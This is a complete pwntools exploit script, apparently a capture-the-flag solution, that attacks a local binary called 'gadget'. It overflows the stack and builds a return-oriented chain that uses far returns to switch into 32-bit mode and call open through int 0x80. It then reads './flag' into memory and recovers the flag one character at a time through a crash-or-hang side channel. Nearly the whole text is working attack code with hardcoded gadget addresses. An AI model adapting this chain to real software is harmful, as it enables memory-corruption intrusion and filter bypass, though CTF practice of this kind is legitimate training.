from pwn import *
context.timeout=3
#context.log_level = "debug"
context.arch = 'amd64'
context.binary = elf = ELF("./gadget")
ru = lambda p, x        : p.recvuntil(x)
sn = lambda p, x        : p.send(x)
rl = lambda p           : p.recvline()
sl = lambda p, x        : p.sendline(x)
rv = lambda p, x=1024   : p.recv(numb = x)
sa = lambda p, a, b     : p.sendafter(a,b)
sla = lambda p, a, b    : p.sendlineafter(a,b)
rr = lambda p, t        : p.recvrepeat(t)
rd = lambda p, x        : p.recvuntil(x, drop=True)
io=process('./gadget')

stack_offset=56
retf = 0x4011ed
syscall=0x401165
int_80=0x4011f3

pop_rax = 0x401001
pop_rdi_rbp = 0x401734
pop_rsi_r15_rbp = 0x401732
pop_rbx_pop_r12_pop_r14_pop_r15_pop_rbp = 0x40172e
pop_r12_pop_r14_pop_r15_pop_rbp = 0x40172f 
pop_rsp_pop_r14_pop_r15_pop_rbp = 0x401730
mov_rdx_r12_call_r14 = 0x402c07
pop_rcx = 0x40117b
jne_ret = 0x408853
sub_rbx_0x41_bl_pop_rsi_pop_r15_pop_rbp_ret = 0x403f14
jmp_rax = 0X40107e
ret = 0x401002


bss_addr=elf.get_section_by_name('.bss').header.sh_addr
fake_stack=(bss_addr & 0xfffffffffffff000) + 0xD00 #open后read的起始位置
flag_path=fake_stack-0x10 #open所需要的字符串
flag_addr_base=fake_stack - 0x200
flag=""
def exp(io,off,cha):
    #success('bss_addr: '+hex(bss_addr))
    #success('fake_stack: '+hex(fake_stack))
    #gdb.attach(io,'b main')
    rbx_need=flag_addr_base+cha
    read_flag_addr=rbx_need+0x41-off
    '''################################
    调用read函数写flag路径 顺便将rbx置位
    ################################'''
    payload1 =b'a'*stack_offset
    payload1+=p64(pop_rax)
    payload1+=p64(0)
    payload1+=p64(pop_rdi_rbp)
    payload1+=p64(0)
    payload1+=p64(fake_stack)
    payload1+=p64(pop_rsi_r15_rbp)
    payload1+=p64(flag_path)
    payload1+=p64(0)
    payload1+=p64(fake_stack)
    payload1+=p64(pop_r12_pop_r14_pop_r15_pop_rbp)
    payload1+=p64(0x300)
    payload1+=p64(syscall)
    payload1+=p64(0)
    payload1+=p64(fake_stack)
    payload1+=p64(mov_rdx_r12_call_r14)
    payload1+=p64(pop_rsp_pop_r14_pop_r15_pop_rbp)
    payload1+=p64(fake_stack)
    sn(io,payload1)

    '''################
    在32位下调用open函数
    ################'''
    payload2 =b'./flag'.ljust(0x10,b'\x00')
    payload2+=p64(syscall)
    payload2+=p64(0)
    payload2+=p64(fake_stack)
    payload2+=p64(pop_rcx)
    payload2+=p64(0)
    payload2+=p64(pop_rbx_pop_r12_pop_r14_pop_r15_pop_rbp)
    payload2+=p64(flag_path)
    payload2+=p64(0x300)
    payload2+=p64(syscall)
    payload2+=p64(0)
    payload2+=p64(fake_stack)
    payload2+=p64(pop_rax)
    payload2+=p64(5)
    payload2+=p64(retf)
    payload2+=p32(int_80)
    payload2+=p32(0x23)# $cs=0x23

    '''################################
    返回64位调用read函数写flag到bss一区域
    ################################'''
    
    payload2+=p32(retf)
    payload2+=p32(pop_rdi_rbp)
    payload2+=p32(0x33)# $cs=0x33
    payload2+=p64(3)
    payload2+=p64(fake_stack)
    payload2+=p64(pop_rsi_r15_rbp)
    payload2+=p64(read_flag_addr)
    
    payload2+=p64(0)
    payload2+=p64(fake_stack)
    payload2+=p64(pop_rax)
    payload2+=p64(0)
    payload2+=p64(syscall)
    payload2+=p64(0)
    '''#################################
    测信道攻击
    #################################'''
    payload2+=p64(pop_rbx_pop_r12_pop_r14_pop_r15_pop_rbp)
    payload2+=p64(rbx_need)
    payload2+=p64(0)*4
    payload2+=p64(sub_rbx_0x41_bl_pop_rsi_pop_r15_pop_rbp_ret)
    payload2+=p64(0)*3
    payload2+=p64(jne_ret)
    payload2+=p64(pop_rax)
    payload2+=p64(jmp_rax)
    payload2+=p64(jmp_rax)


    sl(io,payload2)
    io.recv()
    #pause()
    

if __name__=="__main__":
    for off in range(0,128):
        strl="现在是第"+str(off)+"位"
        print(strl)
        for cha in range(0x20,127):
            io=process('./gadget')
            try:
                exp(io,off,cha)
                flag=flag+chr(cha)
                print("flag:"+flag)
                if chr(cha)=='}':
                    pause()
                io.close()
                break
            except:
                io.close()
                continue
